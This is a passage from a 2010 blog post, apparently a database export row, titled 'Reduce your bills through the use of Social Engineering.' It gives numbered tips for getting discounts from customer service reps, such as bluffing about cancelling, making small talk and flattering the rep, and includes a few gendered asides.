a brick wall with the person you\'re talking to, you have to have an out.  If you hear \"Well, there\'s nothing I can do\".. this is your cue to bail.  \"Hmm.. well.. I\'m going to run it by my wife (girlfriend, grandma, dog, whomever).  How much would it be if I just kept <insert service here>\"  This leads them to believe that you\'re going to talk with someone else who uses these services before you cut the cord.  By ending with a question like that one, it indicates that maybe I don\'t want to cancel ALL of my services.. which is why I need to check with the Mrs\'s.  This covers the bluff.\n\n3) Realize when you\'ve hit a wall and be willing to try again on a different day.  These are people that we\'re dealing with.. people have bad days.  If you encounter someone who\'s having a bad day, retreat and find someone new to deal with.  You should be able to tell from their personality, expressions, and demeanor what mood they\'re in.  If they start out firm, they\'re only going to get more firm with their decision as you complain.  Also, if they don\'t seem to care that they lose you as a customer, consider it game over.\n\n4) If you know more about their services than they do, they\'ll immediately build a trust with what you\'re saying.  So, in this case, first I pointed out a service that the rep didn\'t know exists.  The next rep I pointed out that the DVR doesn\'t work on the plan that I switched to, something she didn\'t know.\n\n5) Try not to be overly social.  They sit on the phone all day with people, they probably don\'t want to hear you talk.  That said, asking them to talk about themselves, which they probably never get to do, might help tremendously.  It totally depends on the person.  If you ask a question about the weather where the rep is located and you get a one word answer, guess what?  He/she doesn\'t want to make small talk and is more interested in just getting you off the phone.  However, if the rep opens up and gives a detailed description about how it\'s \"finally nice outside after a week of crappy weather!\", well, then she wants to talk.  So let her.. if you come across as someone who\'s willing (and interested) in what she\'s talking about, this can really help when it comes to asking her for stuff.  Also, this works much better on women than men.\n\n6) Kind of continuing with #5.. don\'t be too flirty!  Again, this kind of is based on a case by case basis, but women will generally view you as a douche if you\'re too flirty, or if they immediately know that you\'re being flirty.  However, if you\'re really good at flirting and the rep is left with wondering if you were actually flirting with her or not, then, flirt away!  Just know that this can be risky.  Again, it comes down to really just figuring out the mood of the rep that you\'re dealing with.\n\n7) If the rep does something for you, be overly thankful.  Make him/her feel like they\'re the smartest and most competent rep you\'ve dealt with and that you wish all the reps were just like them.  An ego boost is like a drug.. give them a taste and they\'ll want more, which leads to them trying to find other ways to benefit you.  :-)\n\n8 ) Practice makes perfect.  I\'ve been doing this stuff since I was a kid.  I used to call up shops and barter and bargain with the sales people to try to get what I wanted for less than what they were asking.  Skateboards, rc cars, whatever.  Half of the fun of shopping was the calling around to try to manipulate someone into giving me something for less.  So, go through your bills and call each company and see if they have some hidden plan that could save you money.  It can be a lot of fun and rewarding, especially if you\'re able to greatly reduce a bill.\n\nAnyway, what say you?  Any tips you\'d like to share with me?  Let me hear \'em!  :-)\n\n\n\n','','2010-06-21 13:50:40','2010-06-21 18:50:40','','','2010-06-21 13:50:40','2010-06-21 18:50:40','reduce-your-bills-through-the-use-of-social-engineering','0','','publish','Reduce your bills through the use of Social Engineering.','post','');
